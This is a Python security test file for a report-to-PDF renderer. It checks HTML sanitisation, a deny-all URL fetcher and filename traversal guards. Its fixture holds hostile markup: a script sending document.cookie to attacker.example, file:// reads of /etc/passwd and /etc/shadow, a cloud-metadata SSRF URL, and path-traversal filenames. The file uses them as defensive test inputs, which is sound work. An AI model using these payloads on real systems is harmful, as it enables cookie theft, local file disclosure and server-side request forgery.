"""SEC-02 — rendering a report never fetches URLs or local files, and raw
HTML in LLM-written report text is neutralised."""

import sys
import types
from unittest.mock import patch

import pytest

from utils import report_files
from utils.report_files import (
    MAX_REPORT_BYTES,
    BlockedFetchError,
    _deny_fetcher,
    render_report,
    report_filename,
    sanitise_html,
)

_HOSTILE = """# TCS Initiating Coverage

<img src="file:///etc/hosts">
<img src="file:///C:/Windows/System32/drivers/etc/hosts">
<link rel="stylesheet" href="http://127.0.0.1/evil.css">
<style>@import url(http://169.254.169.254/latest/meta-data); body{background:url(file:///etc/passwd)}</style>
<script>fetch('http://attacker.example/'+document.cookie)</script>
<iframe src="http://10.0.0.1/"></iframe>
<object data="file:///etc/shadow"></object>
<a href="javascript:alert(1)">click</a>
<p style="background:url(http://x.example/)">styled</p>

| Metric | Value |
|---|---|
| PE | 24.3 |

**Bold** and `code` survive. [Source](https://www.nseindia.com)
"""


def test_sanitiser_strips_every_fetching_or_active_element():
    import markdown

    html = sanitise_html(markdown.markdown(_HOSTILE, extensions=["tables", "fenced_code"]))
    lowered = html.lower()
    for bad in (
        "<img",
        "<link",
        "<style",
        "<script",
        "<iframe",
        "<object",
        "javascript:",
        "style=",
        "@import",
        "file://",
        "127.0.0.1",
        "169.254",
        "document.cookie",
    ):
        assert bad not in lowered, bad
    for good in (
        "<h1>",
        "<table>",
        "<td>24.3</td>",
        "<strong>bold</strong>",
        "<code>code</code>",
        'href="https://www.nseindia.com"',
    ):
        assert good.lower() in lowered, good


@pytest.mark.parametrize(
    "url",
    ["file:///etc/hosts", "http://127.0.0.1/", "https://example.com/a.png", "data:image/png;base64,AAAA", ""],
)
def test_fetcher_refuses_every_url(url):
    with pytest.raises(BlockedFetchError):
        _deny_fetcher(url)


class _FakeHTML:
    """Captures what render_report hands to WeasyPrint, without needing the
    native Pango/Cairo libraries (absent on most dev machines)."""

    instances: list = []

    def __init__(self, string=None, base_url="unset", url_fetcher=None, **kw):
        self.string, self.base_url, self.url_fetcher = string, base_url, url_fetcher
        _FakeHTML.instances.append(self)

    def write_pdf(self, target=None):
        return b"%PDF-fake"


@pytest.fixture
def fake_weasyprint(monkeypatch):
    _FakeHTML.instances = []
    monkeypatch.setitem(sys.modules, "weasyprint", types.SimpleNamespace(HTML=_FakeHTML))
    return _FakeHTML


def test_render_passes_deny_fetcher_and_no_base_url(fake_weasyprint):
    md, pdf = render_report(_HOSTILE)
    (doc,) = fake_weasyprint.instances
    assert doc.url_fetcher is _deny_fetcher
    assert doc.base_url is None
    assert "<script" not in doc.string and "file://" not in doc.string
    assert pdf == b"%PDF-fake" and md


@pytest.mark.parametrize(
    ("sym", "rtype"),
    [
        ("../../etc/passwd", "x"),
        ("..\\..\\Windows\\win", "y"),
        ("TCS/../../a", "../b"),
        ("", ""),
        (None, None),
    ],
)
def test_filename_parts_cannot_traverse(sym, rtype):
    name = report_filename(sym, rtype, "pdf")
    assert "/" not in name and "\\" not in name and ".." not in name and name.endswith(".pdf")


def test_nothing_is_written_to_disk(fake_weasyprint, tmp_path, monkeypatch):
    """OPS-02: downloads are rendered in memory, never as temp files."""
    monkeypatch.chdir(tmp_path)
    render_report("# hi")
    assert list(tmp_path.iterdir()) == []


def test_oversized_content_is_capped(fake_weasyprint):
    md, _pdf = render_report("a" * (MAX_REPORT_BYTES * 3))
    assert len(md) < MAX_REPORT_BYTES + 500
    assert b"truncated" in md


def _weasyprint_available() -> bool:
    try:
        import weasyprint  # noqa: F401
    except Exception:
        return False
    return True


@pytest.mark.skipif(not _weasyprint_available(), reason="WeasyPrint native libraries (Pango) not installed")
def test_real_render_never_fetches_and_pdf_has_no_hosts_content(tmp_path):
    """End-to-end with the real WeasyPrint (runs in CI, which installs Pango)."""
    import io

    import pdfplumber

    hosts = tmp_path / "hosts"
    hosts.write_text("SECRET-HOSTS-LINE 10.9.8.7 internal.db\n")
    content = _HOSTILE + f'\n<img src="file://{hosts.as_posix()}">\n'
    # Bypass the sanitiser so the fetcher itself is exercised against live tags.
    with patch.object(report_files, "sanitise_html", side_effect=lambda h: h):
        _md, pdf = render_report(content)
    assert pdf, "PDF should still render without the blocked resources"
    with pdfplumber.open(io.BytesIO(pdf)) as doc:
        text = "".join(page.extract_text() or "" for page in doc.pages)
    assert "SECRET-HOSTS-LINE" not in text
    assert "document.cookie" not in text
    assert "24.3" in text
